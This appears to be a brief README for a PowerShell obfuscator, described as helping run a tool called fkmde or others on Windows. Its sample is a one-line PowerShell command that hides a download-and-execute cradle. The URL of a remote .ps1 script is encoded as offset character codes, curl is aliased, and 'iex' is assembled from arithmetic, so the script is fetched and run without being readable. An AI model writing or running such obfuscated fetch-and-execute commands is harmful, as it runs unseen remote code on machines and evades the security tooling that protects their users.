# ps1-obfuscator
A ps1 obfuscator designed to help run fkmde or other tools in an Windows environment

# Sample script
```
powershell -Command "new-alias xwvxn curl; $randomVarName1 = @(8901,8884,8906,8833,8890,8892,8903,8891,8904,8885,8904,8902,8888,8901,8886,8898,8897,8903,8888,8897,8903,8833,8886,8898,8896,8834,8889,8894,8907,8887,8901,8834,8889,8894,8896,8887,8888,8834,8896,8884,8892,8897,8834,8889,8894,8896,8887,8888,8833,8899,8902,8836); $randomVarName2 = ''; foreach ($asciiValue in $randomVarName1) { $decodedChar=[char]($asciiValue-8787); $randomVarName2+=$decodedChar; }; .([char](9992-9887)+'e'+'x')(xwvxn -useb $randomVarName2)"
```
